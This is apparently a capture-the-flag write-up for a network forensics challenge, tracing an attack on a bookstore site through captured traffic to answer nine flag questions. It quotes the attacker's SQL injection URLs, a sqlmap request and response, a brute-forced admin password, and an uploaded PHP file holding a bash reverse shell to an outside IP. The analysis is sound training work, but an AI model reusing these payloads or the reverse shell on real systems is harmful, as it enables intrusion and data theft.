# Web Investigation

##### Q1:
After looking at each ip I saw that the first ip that matched the format was `111.224.250.131`

flag q1: `111.224.250.131`

##### Q2:
I put the ip address in ip lookup and got the country of the ip and the city.

flag q2: `Shijiazhuang`

##### Q3:
After looking at the http objects we can export I saw that `/search.php` apears a lot. I also so `.bash_history` in there and that was my flag that the atacker is probably leaking or has access to run commands. So I looked at what php file did the attacker use before the `.bash_history` and it was `/search.php`

flag q3: `search.php`

##### Q4:
After looking in the http requests that the atacker did we can see that it tries some input injection in the url and then moves to a sqli.
The first sqli atempt it does is: `search.php%3fsearch=book%20and%201=1;%20--%20-`
Url decoding it we get the flag.

flag q4: `/search.php?search=book and 1=1; -- -`

##### Q5:
After searching in Packet Bytes for the string CCONCAT%280x I found the request 1520 that matches the flag format.
`/search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-`
Url decoding it gave me the flag. 

flag q5: `/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -`

##### Q6:

After we look at the request with the sqli we can then see the respins in request **1553**.
If we follow the http stream of the **1553** respons we get this:
```
GET /search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Ctable_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x626f6f6b776f726c645f6462%29--%20- HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.8.3#stable (https://sqlmap.org)
Host: bookworldstore.com
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close


HTTP/1.1 200 OK
Date: Fri, 15 Mar 2024 12:08:56 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 166
Connection: close
Content-Type: text/html; charset=UTF-8

<p>qxvbq["admin", "books", "customers"]qvpjq</p><form action="search.php" method="get">
    <input type="text" name="search" placeholder="Search for books...">
    <input type="submit" value="Search">
</form>
```
Looking at the last part of this respons we can see the names of the tables the hacker leaked.

flag q6: `customers`

##### Q7:
If we use the `http.request.method == POST` filter in wireshark we can look at what data is being submitted.

flag q7: `/admin/`

##### Q8:
If we take a look at the POST methods as before we can see that he makes 4 logins atempts before we accesses `/admin/index.php`.
So we can assume that the last one is the one that is working.

If we inspect it we can see:
```
username=admin&password=admin123%21
```

Url decoding it we get:
```
username=admin&password=admin123!
```

flag q8: `admin:admin123!`

##### Q9:
If we take a look at the POST request made to `/admin/index.php` we can see this:
```
)lv_PVÀ
ET´:@?¹'oàúI|bÃP]ùF¯NÿÔû¬X
9çêj¡7POST /admin/index.php HTTP/1.1
Host: bookworldstore.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------356779360015075940041229236053
Content-Length: 441
Origin: http://bookworldstore.com
Connection: keep-alive
Referer: http://bookworldstore.com/admin/index.php
Cookie: PHPSESSID=ae7mvmmf2krhir4kngnmio680a
Upgrade-Insecure-Requests: 1

-----------------------------356779360015075940041229236053
Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"
Content-Type: application/x-php

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>

-----------------------------356779360015075940041229236053
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------356779360015075940041229236053--
```
(some chars are not ascii printable since thos is decoded from a hexstream)
We can see that there is a field named fileToUpload and a filename. We also see that the contend of the file is to spawn shell. So this is our file.

flag q9: `NVri2vhp.php`